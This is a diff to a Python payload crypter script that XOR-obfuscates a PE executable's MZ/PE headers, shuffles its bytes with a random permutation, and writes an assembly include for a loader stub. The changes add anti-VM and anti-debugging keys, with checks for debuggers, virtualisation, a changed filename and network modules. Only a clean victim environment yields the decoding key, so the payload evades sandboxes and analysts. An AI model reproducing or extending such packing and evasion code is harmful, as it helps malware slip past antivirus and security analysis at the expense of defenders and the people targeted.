@@ -1,4 +1,7 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+
 import random
 import sys
 import struct
@@ -16,7 +19,25 @@ if __name__ == '__main__':
   #  include = include + ('RANDOM8 equ 0x%X ; Random 8 bits\n' % random.randrange(0xff))
   RANDOM8 = random.randrange(0xfe) + 1
   
-  
+ 
+  # Generate AntiVM/Re Xor key
+  RANDOMK1 = random.randrange(0xfe)+1  # Filename change 
+  RANDOMK2 = random.randrange(0xfe) + 1 # No net modules
+  RANDOMK3 = random.randrange(0xfe) + 1 # Is Debugged
+  RANDOMK4 = random.randrange(0xfe) + 1 # Found Debugger Name
+  RANDOMK5 = random.randrange(0xfe) + 1 # Cpu Virt
+
+  RANDOMKF1 = random.randrange(0xfe)+1  # failed Filename change 
+  RANDOMKF2 = random.randrange(0xfe) + 1 # failed No net modules
+  RANDOMKF3 = random.randrange(0xfe) + 1 # failed Is Debugged
+  RANDOMKF4 = random.randrange(0xfe) + 1 # failed Found Debugger Name
+  RANDOMKF5 = random.randrange(0xfe) + 1 # failed Cpu Virt
+
+
+  RANDOMDK = RANDOMK5 ^ RANDOMK4 ^ RANDOMK3 ^ RANDOMK2 ^ RANDOMK1
+
+  print ('* Xor Key for BBox is %X. based on %X %X %X %X %X' % (RANDOMDK, RANDOMK1, RANDOMK2, RANDOMK3, RANDOMK4, RANDOMK5)) 
+
   # Charge le payload
   try:
     print ('* Loading payload: %s' % sys.argv[1])
@@ -44,9 +65,9 @@ if __name__ == '__main__':
   print('* PE Header Location at 0x%X ' %(pelocation))
   print('* Obfuscating PE and MZ Headers, Clean Timestamp')
   
-  # Xor MZ
-  payload[0x0] = payload[0x0] ^ RANDOM8
-  payload[0x1] = payload[0x1] ^ RANDOM8
+  # Xor MZ..(ZM is also valid)
+  payload[0x0] = ord('Z') ^ RANDOM8
+  payload[0x1] = ord('M') ^ RANDOM8
   # Xor PE
   payload[pelocation+0x0] = payload[pelocation] ^ RANDOM8
   payload[pelocation+0x1] = payload[pelocation+0x1] ^ RANDOM8
@@ -88,12 +109,7 @@ if __name__ == '__main__':
     bboxarray.append(i)
   random.shuffle(bboxarray)
   
-
-  #bboxarray = [4,2,3,1,0]
-  #bboxlen = 5
-  #print bboxarray
-
-  opayload = bytearray(bboxarray)
+  #opayload = bytearray(bboxarray)
 
   fullrow = payload_len // bboxlen 
   restrow = payload_len % bboxlen
@@ -108,14 +124,25 @@ if __name__ == '__main__':
     fullrow = payload_len // bboxlen 
     restrow = payload_len % bboxlen
     print ('* Final Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
-   
+  
+  
+  print bboxarray
+  bboxarrayxor= []
+  #Place la bbox xorée devant le payload bboxe 
+  for J in range (0,bboxlen ):
+    bboxarrayxor.append( bboxarray[J] ^ RANDOMDK)
+  
+  print bboxarrayxor
+  opayload = bytearray(bboxarrayxor)
+
   for BBraw in range(0,fullrow):
     for I in bboxarray:
       opayload.append(payload[(BBraw*bboxlen)+I])
      # print hex(payload[(BBraw*bboxlen)+I]) ,
     #print ""
   #opayload = payload
- 
+
+
   out = bytearray(opayload)
   
 
@@ -123,12 +150,27 @@ if __name__ == '__main__':
     f.write(out)
 
   include = ('PELEN dd 0x%X ; PE Len\n' % payload_len)
-  include = include + ('BBLEN db 0x%X ; BBox Key Len\n' % bboxlen) 
+  include = include + ('%%define BBLEN  0x%X ; BBox Key Len\n' % bboxlen) 
   include = include + ('%%define EPELEN  0x%X; PE Len equ\n' % payload_len)
-  include = include + ('%%define RANDOMs 0x%X ; Random 8 bits\n' % random.randrange(0x16))
+  include = include + ('%%define RANDOMs 0x%X ; Random 4 bits\n' % random.randrange(0x16))
   include = include + ('%%define RANDOM8 0x%X ; Random 8 bits\n' % RANDOM8)
-  include = include + ('%%define RANDOM16 0x%X ; Random 8 bits\n' % random.randrange(0xffff))
-  include = include + ('%%define RANDOM32 0x%X ; Random 8 bits\n' % random.randrange(0xffffffff)) 
+  include = include + ('%%define RANDOM16 0x%X ; Random 16 bits\n' % random.randrange(0xffff))
+  include = include + ('%%define RANDOM32 0x%X ; Random 32 bits\n' % random.randrange(0xffffffff)) 
+  
+  include = include + ('%%define RANDOMK1 0x%X ; Random 8 bits\n' % RANDOMK1)
+  include = include + ('%%define RANDOMK2 0x%X ; Random 8 bits\n' % RANDOMK2)
+  include = include + ('%%define RANDOMK3 0x%X ; Random 8 bits\n' % RANDOMK3)
+  include = include + ('%%define RANDOMK4 0x%X ; Random 8 bits\n' % RANDOMK4)
+  include = include + ('%%define RANDOMK5 0x%X ; Random 8 bits\n' % RANDOMK5)
+  
+  include = include + ('%%define RANDOMKF1 0x%X ; Random 8 bits\n' % RANDOMKF1)
+  include = include + ('%%define RANDOMKF2 0x%X ; Random 8 bits\n' % RANDOMKF2)
+  include = include + ('%%define RANDOMKF3 0x%X ; Random 8 bits\n' % RANDOMKF3)
+  include = include + ('%%define RANDOMKF4 0x%X ; Random 8 bits\n' % RANDOMKF4)
+  include = include + ('%%define RANDOMKF5 0x%X ; Random 8 bits\n' % RANDOMKF5)
+  
+  
+  
   with open('payload.inc', 'w') as f:
      f.write(include)
 
